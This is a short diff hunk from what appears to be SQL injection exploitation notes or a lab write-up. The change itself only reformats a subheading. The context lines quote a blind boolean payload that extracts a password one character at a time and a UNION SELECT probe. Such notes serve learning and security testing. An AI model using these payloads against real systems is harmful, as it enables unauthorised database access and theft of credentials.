@@ -54,7 +54,7 @@ III. Exploitation
     Payload7:' OR (SELECT CASE WHEN SUBSTRING(password,§1§,1)='§a§' THEN 1=1 ELSE 1=2 END)#//
     ~~~  
     
-   **Other Avenues for exploiting VIA TIME BASED AND UNION SELECT:**
+    Other Avenues for exploiting VIA TIME BASED AND UNION SELECT:
     ~~~
     Payload: ' OR (UNION SELECT NULL#) // This also doesn't give us an error but adding a second NULL value errors   
     
